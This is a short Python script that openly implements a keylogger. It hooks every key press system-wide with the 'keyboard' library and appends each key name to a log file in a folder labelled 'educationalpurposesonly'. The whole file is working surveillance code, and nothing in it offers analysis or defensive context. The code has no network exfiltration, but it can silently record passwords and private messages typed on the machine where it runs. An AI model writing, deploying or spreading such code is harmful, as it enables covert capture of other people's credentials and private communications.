import logging
import keyboard

log_file = 'C:/Temp/educationalpurposesonly/log.txt'

def on_press(event):
    try:
        with open(log_file, 'a') as f:
            f.write(f"{event.name}\n")
    except Exception as e:
        logging.error(f"Error capturing key: {e}")

def run_keylogger():
    logging.basicConfig(level=logging.ERROR)
    keyboard.on_press(on_press)
    keyboard.wait()

if __name__ == "__main__":
    run_keylogger()
